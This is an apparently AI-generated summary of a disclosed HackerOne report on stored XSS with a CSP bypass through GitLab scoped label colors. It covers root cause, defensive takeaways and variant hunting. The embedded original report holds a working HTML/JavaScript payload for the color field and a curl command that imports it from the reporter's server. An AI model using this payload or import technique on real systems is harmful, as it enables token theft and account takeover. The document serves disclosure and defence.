# Stored-XSS with CSP-bypass via Scoped Labels' Color

## Metadata
- **Source:** HackerOne
- **Report:** 1693150 | https://hackerone.com/reports/1693150
- **Submitted:** 2022-09-07
- **Reporter:** yvvdwf
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Stored Cross-Site Scripting (XSS), Content Security Policy (CSP) Bypass, Insufficient Input Validation, HTML Injection
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability with CSP bypass exists in GitLab's scoped labels feature where arbitrary HTML/JavaScript can be injected via the label color field during GitHub project imports. The vulnerability persists across multiple pages including issues and merge requests through GitLab-specific references, allowing attackers to execute arbitrary actions on behalf of authenticated victims.

## Attack scenario
1. Attacker creates a malicious GitHub repository with a scoped label containing XSS payload in the color field (e.g., `yvvdwf::label-name` with color containing `<script>` tags)
2. Attacker hosts a dummy GitHub server with the malicious label configuration or waits for victim to import a compromised repository
3. Victim with GitLab Premium account imports the GitHub project via GitLab's import functionality using a personal access token
4. The malicious scoped label color payload is stored in GitLab's database without proper sanitization
5. When victim or other users view the labels page, issues, or merge requests referencing the scoped label, the JavaScript executes in their browser context
6. Attacker's JavaScript can steal tokens, modify account settings (including username), create fake account takeover, or extract private data via API calls on behalf of the victim

## Root cause
GitLab's mitigation for stored XSS via label colors (in version 15.3.2) failed to address the scoped labels code path in `ee/app/helpers/ee/labels_helper.rb`. The color field from imported GitHub labels was not properly sanitized or validated when processing scoped labels, allowing HTML/JavaScript injection. The vulnerability was missed because the fix only addressed regular labels and not the enterprise edition's scoped labels feature.

## Attacker mindset
An attacker would recognize that recent XSS fixes in GitLab likely addressed only the most obvious code paths, leaving edge cases like premium features (scoped labels) unpatched. They would leverage the GitHub import functionality as an attack vector since it accepts external label data with minimal validation. The attacker could abuse the CSP bypass to escalate from XSS to account takeover by manipulating usernames and API tokens, effectively achieving lateral movement across victim's connected resources.

## Defensive takeaways
- Implement input validation and output encoding for ALL label-related code paths, not just primary ones, including enterprise/premium features
- Apply the same sanitization rules consistently across regular labels and scoped labels in template rendering
- Validate and sanitize color field inputs during GitHub project imports before storing in database
- Use a content security policy that prevents inline script execution and applies to all user-generated content rendering
- Implement an HTML sanitizer library (e.g., DOMPurify) for any user-controlled content that may be rendered as HTML
- Add security test coverage specifically for imported labels from external sources
- Review all premium/enterprise feature code paths for similar sanitization gaps when applying security patches
- Consider allowlisting valid CSS color values rather than blacklisting dangerous content
- Implement API-level validation to reject labels with suspicious characters in color fields

## Variant hunting
Look for similar patterns in other GitLab features that accept external data through imports: wiki pages, custom fields, project descriptions, milestones, and other premium features. Check if similar XSS bypasses exist in other code paths that handle user-provided colors or styling attributes. Test whether other import sources (Jira, Bitbucket) have similar issues. Investigate if the same bypass applies to group labels vs project labels, or protected vs unprotected labels.

## MITRE ATT&CK
- T1190
- T1059
- T1566
- T1598
- T1539
- T1056
- T1020

## Notes
This is a bypass of a prior security fix (CVE from report 1665658), demonstrating the importance of comprehensive patching across all code variants. The attacker can import from external GitHub servers, making the attack surface larger. The ability to perform 'fake account takeover' by changing username is particularly severe. The reporter properly disclosed the gap in the previous fix and followed responsible disclosure by creating a new report rather than exploiting the unpatched scoped labels feature.

## Full report
<details><summary>Expand</summary>

Hi team,

The [Stored-XSS with CSP-bypass via labels' color](https://hackerone.com/reports/1665658) has been mitigated in [Gitlab 15.3.2](https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#stored-xss-via-labels-color). However it is not enough because it missed the case of [scoped label](https://gitlab.com/gitlab-org/gitlab/-/blob/85041966ed3eba23ee530a20c2eee374ef6e8617/ee/app/helpers/ee/labels_helper.rb#L33).

I notified this missing in the [original report](https://hackerone.com/reports/1665658#activity-18273269) and @galfaro encouraged me to submit a new report about this.


# Step to reproduce:

- To reproduce, we need the following prerequisites:

   + [Scoped labels](https://docs.gitlab.com/ee/user/project/labels.html#scoped-labels) are available in Gitlab Premium, so we need a premium account that can be obtained via the [free trial](https://about.gitlab.com/free-trial/)
   + A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.

- Github does not allow to create arbitrary label colors. You can find in the attachment a dummy Github server in which we set a new label:
   + name: `yvvdwf::label-name` (the `::` to scope the label)
   + color: `">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>`

- To easily reproduce, I'm hosting the dummy Github server at my own VPS, `http://51.75.74.52:11211`, I will shut it down once you validated the report.

- Open a new terminal, then run the following command, in which:
   + `$GL_TOKEN` is the the api token you've created above
   + `yvvdwf-group-a` is a group (or account) name having premium features


For example:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: $GL_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf-group-a",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:11211"
}'
```

- After finishing, you can view the list of the label of the imported project. You should see a popup created by this javascript `alert(document.domain)`

- Since we can control the label color, we can create a Stored-XSS with CSP-bypass on another place rather than the page that lists the labels, such as, an issue or a merged request of another project by using [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

# Example:

- https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/labels
- https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/issues/1

# Output of checks

This bug happens on GitLab.com

# Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

Beside that, I would like to clarify some other metrics in the CVSS (the text in **bold** is copied from [your cvss calculator](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator) )

- `AC:L`: **Stored XSS on a page that's part of the user's normal workflow (issue or merge request page)**: As I mentioned above the store-XSS is on the issue/MR requests of a project the attack may create an issue/MR
- `PR:N`: **The attacker is logged out - PR:N - but the victim is logged in**: The stored-XSS still exist even the attacker is logged out. 
- `C:H`: **Access tokens, runner tokens. Private repositories**: Indeed the XSS allows to execute any Rest API on behalf of the victim to get almost arbitrary private information of the victim (unless his password). It can even perform a *fake* account-take-over by changing the victim's username and immediately register a new account within the victim's username (as changing username does not require to confirm password)
- `A:L`: This Store-XSS with CSP-bypass can easily create DoS at the client side by exhausting CPU and RAM of the victim's Web browser. It can also be used to send as much as possible the requests to the server. The number of requests can increase by the number of victims who are viewing the XSS.

Best regards,

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

</details>

---
*Analysed by Claude on 2026-05-12*
